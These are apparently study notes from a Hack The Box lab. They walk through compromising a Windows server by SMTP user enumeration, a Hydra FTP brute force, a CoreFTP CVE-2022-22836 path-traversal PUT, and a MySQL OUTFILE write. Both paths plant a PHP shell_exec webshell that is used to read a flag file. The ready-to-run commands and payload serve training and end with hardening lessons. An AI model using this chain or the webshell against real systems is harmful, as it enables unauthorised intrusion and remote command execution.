---
tags: [lab, attack/network, enumeration/smtp, attack/network]
module: attacking_common_services
last_updated: 2026-05-12
source_count: 1
---

# HTB Lab — Attacking Common Services: Easy Skill Assessment

**Difficulty:** Easy
**Target IP:** STMIP (your spawned machine IP)
**OS:** Windows

Simulated engagement against a Windows server running multiple services. One question, two complete attack paths to the same flag. The core technique is cross-service credential reuse: a username found via SMTP and a password cracked via FTP unlock both a CoreFTP directory traversal exploit and a MySQL file-write primitive — both drop a PHP webshell into the Apache web root.

---

## Question 1

> You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer.

---

## Phase 1 — Service Discovery

### Step 1 — nmap full scan

```bash
nmap -A STMIP
```

Expected services:

| Port | Service | Version |
|------|---------|---------|
| 21/tcp | FTP | Core FTP Server 2.0 build 725 |
| 25/tcp | SMTP | hMailServer |
| 80/tcp | HTTP | Apache 2.4.53 (XAMPP on Windows) |
| 443/tcp | HTTPS | Core FTP HTTPS Server |
| 587/tcp | SMTP | hMailServer (submission port) |
| 3306/tcp | MySQL | MariaDB 10.4.24 |

The nmap output tells you a lot before any authentication:
- **CoreFTP** is serving both FTP (21) and HTTPS (443)
- **Apache/XAMPP** is on port 80 — a Windows PHP stack often writable via MySQL OUTFILE
- **SMTP** is open with VRFY enabled (see `smtp-commands` in nmap output) — username enumeration is possible
- **MySQL** is exposed externally — unusual, and worth testing with discovered credentials

### Step 2 — Download the users wordlist

The module provides a username list as a resource on the Academy page:

```bash
wget https://academy.hackthebox.com/storage/resources/users.zip && unzip users.zip
```

This extracts `users.list` — 79 candidate usernames.

---

## Phase 2 — SMTP User Enumeration

### Step 3 — Find a valid account

```bash
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t STMIP
```

#### Flag breakdown

| Flag | Value | What it does |
|------|-------|-------------|
| `-M` | `RCPT` | **Enumeration method.** Controls which SMTP command is used to test each username. Three options exist: `VRFY` (directly asks "does this user exist?"), `EXPN` (expands mailing list aliases), and `RCPT` (attempts to address mail to the user). `RCPT` is chosen here because `VRFY` is disabled on most modern mail servers and `EXPN` is rarely enabled. The server must respond to `RCPT TO` to function as a mail server, so it cannot be fully disabled. |
| `-U` | `users.list` | Wordlist of candidate usernames to test — one per line, no domain attached. smtp-user-enum constructs the full address using the `-D` flag. |
| `-D` | `inlanefreight.htb` | Domain appended to each username, producing `username@inlanefreight.htb` in the `RCPT TO` probe. See the note below about whether this requires DNS. |
| `-t` | `STMIP` | Target IP of the SMTP server. The tool connects directly to this IP on TCP/25 — no hostname resolution involved. |

**What `-M RCPT` actually sends:** For each username in the list, smtp-user-enum opens an SMTP connection and sends:

```
EHLO test
MAIL FROM:<test@test.com>
RCPT TO:<username@inlanefreight.htb>
```

A `250 OK` response to the `RCPT TO` line means the server accepts mail addressed to that user — the account exists. A `550 No such user` response means it doesn't. The server must make this distinction to route mail correctly, which is why this works even when `VRFY` is explicitly disabled.

#### Does `-D inlanefreight.htb` require an /etc/hosts entry?

No. The `-D` flag is not a hostname that gets resolved — it is a string that smtp-user-enum appends to each username to construct a full email address. The tool sends `RCPT TO:<username@inlanefreight.htb>` to the SMTP server. The SMTP server's IP is specified separately via `-t STMIP`, so the tool connects directly to that IP. `inlanefreight.htb` never goes through DNS — it is just the domain portion of the email address being tested.

You would need an `/etc/hosts` entry for `inlanefreight.htb` if you were using a tool that resolves hostnames through the OS (e.g., a browser, curl without an explicit IP, or a tool that doesn't have a `-t` flag for a direct IP target). Here, the IP and the domain are completely separate inputs and no DNS lookup happens.

Expected output:

```
######## Scan started at Sun Nov 27 14:11:34 2022 #########
10.129.x.x: fiona@inlanefreight.htb exists
######## Scan completed at Sun Nov 27 14:11:36 2022 #########
1 results.
```

Valid username: **fiona**

The RCPT method sends a `RCPT TO:<user@domain>` probe for each candidate and records a `250 OK` response as a confirmed account. See [[tools/enumeration/smtp_user_enum]] for mode selection.

---

## Phase 3 — FTP Password Brute-Force

### Step 4 — Crack fiona's FTP password

```bash
hydra -l fiona -P /usr/share/wordlists/rockyou.txt ftp://STMIP -t 1
```

| Flag | What it does |
|------|-------------|
| `-l fiona` | Single username (note: FTP uses just the username, not `user@domain`) |
| `-P rockyou.txt` | Password wordlist |
| `ftp://STMIP` | FTP protocol on port 21 |
| `-t 1` | **Critical: one thread only.** CoreFTP returns `550 Too many connections` if Hydra opens multiple simultaneous connections. Running with the default thread count causes all probes to fail. |

> **rockyou note:** On Kali, rockyou ships compressed. Decompress before use:
> ```bash
> gunzip /usr/share/wordlists/rockyou.txt.gz
> ```

Expected output:

```
[21][ftp] host: 10.129.x.x   login: fiona   password: 987654321
```

Credentials: **fiona / 987654321**

---

## Phase 4 — FTP Reconnaissance

### Step 5 — Log in and pull files

```bash
ftp STMIP
```

Enter `fiona` as username and `987654321` as password when prompted.

```
ftp> dir
ftp> get docs.txt
ftp> get WebServersInfo.txt
ftp> bye
```

### Step 6 — Read WebServersInfo.txt

```bash
cat WebServersInfo.txt
```

```
CoreFTP:
Directory C:\CoreFTP
Ports: 21 & 443
Test Command: curl -k -H "Host: localhost" --basic -u <username>:<password> https://localhost/docs.txt

Apache
Directory "C:\xampp\htdocs\"
Ports: 80 & 4443
Test Command: curl http://localhost/test.php
```

Two critical facts emerge:
- The **CoreFTP HTTPS server** (443) serves files from `C:\CoreFTP\` — but its path traversal vulnerability lets you write outside this directory
- The **Apache web root** is `C:\xampp\htdocs\` on port 80 — any file written here is executable as PHP

Both attack paths exploit the fact that Apache is serving PHP from a known directory.

---

## Attack Path A — CoreFTP CVE-2022-22836 (Directory Traversal via HTTP PUT)

CoreFTP Server before build 727 allows an authenticated user to create files anywhere on the filesystem by using `../` sequences in an HTTP PUT request path. The server doesn't sanitize the path, so you can traverse out of the CoreFTP directory and write into the Apache web root.

### How you know to look for a CoreFTP exploit

Go back to the nmap output from Step 1. The FTP banner reads:

```
220 Core FTP Server Version 2.0, build 725, 64-bit Unregistered
```

This is a version string — software name, version, and build number, handed to you before any authentication. The process from here is standard:

1. **Identify the software and version** — `Core FTP Server`, build `725`
2. **Search for known exploits** — searchsploit and CVE databases index exploits by product name and version

```bash
searchsploit CoreFTP
```

```
CoreFTP 2.0 Build 674 MDTM - Directory Traversal (Metasploit)      | windows/remote/48195.txt
CoreFTP 2.0 Build 674 SIZE - Directory Traversal (Metasploit)      | windows/remote/48194.txt
CoreFTP 2.1 b1637 - Password field Universal Buffer Overflow        | windows/local/11314.py
CoreFTP Server build 725 - Directory Traversal (Authenticated)      | windows/remote/50652.txt
```

The fourth result matches exactly: **build 725**, which is the version nmap identified. The "(Authenticated)" label tells you credentials are required — which you have (`fiona:987654321`).

### Step 7a — Read the exploit and understand it

```bash
searchsploit -m windows/remote/50652.txt
cat 50652.txt
```

```
# Exploit Title: CoreFTP Server build 725 - Directory Traversal (Authenticated)
# CVE : CVE-2022-22836

CoreFTP Server before 727 allows directory traversal (for file creation)
by an authenticated attacker via ../ in an HTTP PUT request.

# Proof of Concept:
curl -k -X PUT -H "Host: <IP>" --basic -u <username>:<password> \
     --data-binary "PoC." --path-as-is https://<IP>/../../../../../../whoops
```

The exploit does two things: it sends an HTTP PUT request (which creates a file), and it uses `../` sequences in the path to escape the CoreFTP serve directory and land the file somewhere else on the filesystem.

`--path-as-is` tells curl not to normalize the `../` sequences — they must reach the server as-is for the traversal to work. Without this flag, curl collapses `../../` into nothing before sending the request and the exploit silently fails.

### Step 8a — Write a PHP webshell to the Apache root

Generate a random filename to avoid collisions:

```bash
openssl rand -hex 16
# e.g. 1af271ec0935f7ccbd31dc24666f7f33
```

Write the webshell via the CoreFTP HTTPS PUT endpoint:

```bash
curl -k -X PUT -H "Host: STMIP" \
     --basic -u fiona:987654321 \
     --data-binary '<?php echo shell_exec($_GET["c"]);?>' \
     --path-as-is \
     https://STMIP/../../../../../../xampp/htdocs/1af271ec0935f7ccbd31dc24666f7f33.php
```

| Part                                         | What it does                                                       |
| -------------------------------------------- | ------------------------------------------------------------------ |
| `-k`                                         | Skip TLS certificate verification (the cert is self-signed)        |
| `-X PUT`                                     | HTTP PUT method — creates the file at the specified path           |
| `--basic -u fiona:987654321`                 | HTTP Basic auth with the FTP credentials                           |
| `--data-binary '<?php...?>'`                 | Webshell content written as the file body                          |
| `--path-as-is`                               | Preserve `../` sequences — required for path traversal             |
| `/../../../../../../xampp/htdocs/<name>.php` | Traverse from CoreFTP root to drive root, then into XAMPP web root |

A `200 Ok` response confirms the file was written.

#### How do you know how many `../` sequences to use?

This is not trial and error — `WebServersInfo.txt` already told you the answer. It stated:

```
CoreFTP:
Directory C:\CoreFTP
```

The CoreFTP HTTPS server roots its file serving at `C:\CoreFTP\`. Each `../` in the PUT path climbs one directory level. To escape `C:\CoreFTP\` and reach the drive root `C:\`, you only need **one** `../`. After that, you navigate forward into `xampp\htdocs\`.

In practice, six `../` sequences are used rather than one. The reason is safety: **extra traversal sequences above the root are silently discarded by the OS**. You cannot go higher than `C:\` — the filesystem root absorbs any excess. So `/../../../../../../` always lands at `C:\` regardless of how many extra levels you add, and then `xampp/htdocs/shell.php` resolves to `C:\xampp\htdocs\shell.php`.

The mental model:

```
PUT path sent:  /../../../../../../xampp/htdocs/shell.php
Server root:    C:\CoreFTP\

Traversal:
  C:\CoreFTP\          (start — the HTTPS server's root)
  C:\                  (first ../ — exits CoreFTP directory)
  C:\                  (second ../ — already at root, stays here)
  C:\                  (third through sixth ../ — same, root absorbs them)
  C:\xampp\htdocs\     (forward path appended)
  C:\xampp\htdocs\shell.php  (final resolved path)
```

Using more `../` than needed is intentional — it handles cases where the server root is nested deeper than you expect, without any downside. If you were uncertain about the CoreFTP directory depth and `WebServersInfo.txt` hadn't revealed it, you would start with a large number like 8–10 and work downward.

### Step 9a — Use the webshell to find the flag

The webshell is now in the Apache web root and accessible over HTTP (not HTTPS — Apache is on port 80). The webshell executes any Windows command you pass in the `?c=` parameter and prints the output.

#### Why a webshell?

You now have the ability to write a file to a directory that Apache serves as PHP. PHP's `shell_exec()` runs OS commands and returns their output. Combining these two facts — writable web root, PHP execution — a one-line PHP file becomes a full command execution interface. This is the standard technique whenever you can write arbitrary files into a PHP-enabled web root.

#### Enumerating to find the flag location

The lab briefing says a flag was placed on the server. You don't know exactly where yet. The webshell gives you arbitrary command execution, so enumerate like you would in any post-exploitation scenario on Windows:

```bash
# Who is the server running as?
curl -w "\n" "http://STMIP/<shell>.php?c=whoami"

# List user home directories to see what accounts exist
curl -w "\n" "http://STMIP/<shell>.php?c=dir%20C:\\users\\"

# Check the Administrator desktop — the most common flag location in HTB labs
curl -w "\n" "http://STMIP/<shell>.php?c=dir%20C:\\users\\administrator\\desktop\\"
```

On a standard Windows box, `C:\Users\` contains a folder for each user account. HTB flags are almost always placed on a user's Desktop — start with `Administrator` on Windows targets. The `dir` command on the Desktop will list what files are there before you try to read them.

```bash
# Typical dir output showing the flag file
# Volume in drive C has no label.
# ...
# 04/20/2022  03:49 PM                15 flag.txt
```

#### Read the flag

```bash
curl -w "\n" "http://STMIP/1af271ec0935f7ccbd31dc24666f7f33.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt"
```

#### How to construct a webshell curl command from a Windows command

The URL in the curl command is not something you type from memory — you build it in two steps: write the command you want to run, then encode it for the URL.

**Step 1 — Write the plain Windows command**

```
type C:\users\administrator\desktop\flag.txt
```

This is what you would type into a `cmd.exe` prompt. `type` prints a file's contents, exactly like `cat` on Linux.

**Step 2 — URL-encode it**

URLs cannot contain spaces or backslashes as-is — they have reserved meanings in HTTP. Each character that isn't a safe URL character must be replaced with a percent-encoded equivalent (`%XX` where XX is the hex value of the character).

The two characters that need encoding here:

| Character | URL encoding | Why |
|-----------|-------------|-----|
| ` ` (space) | `%20` | Spaces delimit URL components — they must be encoded |
| `\` (backslash) | `%5C` | Technically unsafe, but most servers accept raw backslashes in query strings |

A quick way to URL-encode a command without memorising codes:

```bash
python3 -c "import urllib.parse; print(urllib.parse.quote('type C:\\\\users\\\\administrator\\\\desktop\\\\flag.txt'))"
# Output: type%20C%3A%5Cusers%5Cadministrator%5Cdesktop%5Cflag.txt
```

In practice, servers running PHP on Windows accept unencoded backslashes in query strings, so you usually only need to encode the space:

```
type C:\users\administrator\desktop\flag.txt
→ type%20C:\users\administrator\desktop\flag.txt
```

**Step 3 — Handle bash's own backslash escaping**

This is where the `\\` in the curl command comes from — it is not URL encoding, it is bash escaping.

Inside a **double-quoted** bash string, `\` is an escape character. To get a literal `\` in the string, you write `\\`. So when you type:

```bash
"?c=type%20C:\\users\\administrator\\desktop\\flag.txt"
```

bash sees `\\` and produces a single `\` in the actual string passed to curl. The URL curl sends is:

```
?c=type%20C:\users\administrator\desktop\flag.txt
```

which is exactly what you want the server to receive.

**Alternative: use single quotes to skip bash escaping**

Single-quoted strings in bash are passed literally — no escaping happens at all. This lets you write backslashes directly:

```bash
curl -w "\n" 'http://STMIP/shell.php?c=type%20C:\users\administrator\desktop\flag.txt'
```

The tradeoff: single quotes prevent bash from expanding variables like `$STMIP`, so you must substitute the actual IP manually.

**Quick reference — building any webshell command**

```
1. Write the Windows command:
   dir C:\users\

2. Replace spaces with %20:
   dir%20C:\users\

3. Choose quoting:
   Double quotes → escape each \ as \\
   Single quotes → write \ directly, no variable expansion

4. Assemble the full curl:
   curl -w "\n" "http://STMIP/shell.php?c=dir%20C:\\users\\"
   # or
   curl -w "\n" 'http://STMIP/shell.php?c=dir%20C:\users\'
```

---

## Attack Path B — MySQL OUTFILE Webshell

The same `fiona:987654321` credentials that worked for FTP also work for MySQL. MariaDB's `SELECT ... INTO OUTFILE` statement writes query results as a file, which can be used to drop a webshell directly into the Apache root — no exploit required.

### Step 7b — Connect to MySQL

```bash
mysql -u fiona -p987654321 -h STMIP
```

### Step 8b — Post-auth MySQL enumeration: what can this account do?

When you gain MySQL access with new credentials the first questions are: who am I, what can I read, and what can I write? This is a standard post-auth checklist, not something you need to guess at.

```sql
-- Who is this account?
SELECT user();

-- What privileges does it have?
SHOW GRANTS;

-- Can the server read and write files?
SHOW VARIABLES LIKE "secure_file_priv";
```

`secure_file_priv` is the MySQL variable that controls filesystem access for `LOAD DATA INFILE` (read) and `SELECT ... INTO OUTFILE` (write). It has three possible states:

| Value | Meaning |
|-------|---------|
| *(empty string)* | No restriction — read/write anywhere the OS user has permission |
| `/some/path/` | Restricted — file operations only within that directory |
| `NULL` | Completely disabled — no file operations allowed |

```sql
SHOW VARIABLES LIKE "secure_file_priv";
```

```
+------------------+-------+
| Variable_name    | Value |
+------------------+-------+
| secure_file_priv |       |
+------------------+-------+
```

The empty value here means the MySQL process can write to any path it has OS-level permission to reach — including `C:\xampp\htdocs\`, because XAMPP typically runs its services under a permissive account. This is the configuration that makes OUTFILE webshells possible.

Check `secure_file_priv` immediately on any MySQL login during an engagement. An empty value is a direct path to RCE if a web server is running on the same host.

### Step 9b — Write the webshell via OUTFILE

```sql
SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE 'C:/xampp/htdocs/90957b76a1f20de2b13c5bcb2d05b5cf.php';
```

Note: use forward slashes in the MySQL path even on Windows — MariaDB accepts them. Use `C:/xampp/htdocs/` not `C:\xampp\htdocs\`.

A `Query OK, 1 row affected` response means the file was written.

### Step 10b — Use the webshell to find and read the flag

Same enumeration approach as Path A — the webshell is identical regardless of how it was delivered. Run `whoami`, enumerate `C:\Users\`, confirm the Administrator Desktop contains `flag.txt`, then read it:

```bash
curl -w "\n" "http://STMIP/90957b76a1f20de2b13c5bcb2d05b5cf.php?c=dir%20C:\\users\\administrator\\desktop\\"
curl -w "\n" "http://STMIP/90957b76a1f20de2b13c5bcb2d05b5cf.php?c=type%20C:\\users\\administrator\\desktop\\flag.txt"
```

See Step 9a for the full enumeration walkthrough explaining how to discover the flag location from scratch.

---

## Why Both Paths Work

The two paths converge on the same result because:

1. **Credential reuse across services** — fiona's password works for FTP and MySQL. This is common when services share a central auth database or when users reuse passwords.
2. **Writable web root** — Apache's `C:\xampp\htdocs\` is world-writable from both the CoreFTP service account and the MySQL service account. A locked-down web root would block both.
3. **PHP execution** — Apache is configured to execute PHP. If PHP were disabled or the web root served static files only, dropping a `.php` file would do nothing.

Block any one of these — restrict `secure_file_priv`, tighten NTFS permissions on htdocs, or disable PHP — and neither path works.

---

## Lessons Learned

- **Start with SMTP enumeration** — SMTP is often the first confirmation of valid account names. Those names feed directly into brute-force attempts on every other service.
- **FTP thread throttling (`-t 1`)** — CoreFTP and some other FTP servers impose connection limits. If Hydra returns `550` errors immediately, reduce threads to 1 before assuming the credentials don't exist.
- **Files left on the FTP server are intelligence** — `WebServersInfo.txt` handed over the Apache directory path and confirmed CoreFTP HTTPS was on port 443. Always enumerate FTP file listings fully before moving on.
- **Check `secure_file_priv` early** — whenever you have MySQL credentials, run `SHOW VARIABLES LIKE "secure_file_priv"` immediately. An empty value is a high-severity finding that can lead directly to RCE via OUTFILE.
- **CVE-2022-22836 requires `--path-as-is`** — curl normalizes `../` by default. Without `--path-as-is`, the path traversal never reaches the server and the exploit fails silently.
- **Use HTTP to trigger the webshell, not HTTPS** — CoreFTP serves HTTPS (443); Apache serves HTTP (80). The PUT goes to CoreFTP, the GET goes to Apache. Using the wrong port returns a 404 or no response.

## Related Pages

- [[attack/ftp]] — FTP attack techniques; CVE-2022-22836 CoreFTP path traversal
- [[attack/smtp]] — SMTP user enumeration and password spraying
- [[attack/sql_databases]] — MySQL OUTFILE webshell, secure_file_priv, LOAD_FILE
- [[tools/enumeration/smtp_user_enum]] — RCPT mode user enumeration
- [[tools/attack/hydra]] — brute-force flags; thread count gotcha for rate-limited services
- [[enumeration/ftp]] — FTP enumeration and anonymous login
- [[enumeration/mysql]] — secure_file_priv, dangerous config settings

## Sources

- raw/lab/attacking_common_services/lab_easy_skill_assessment.md
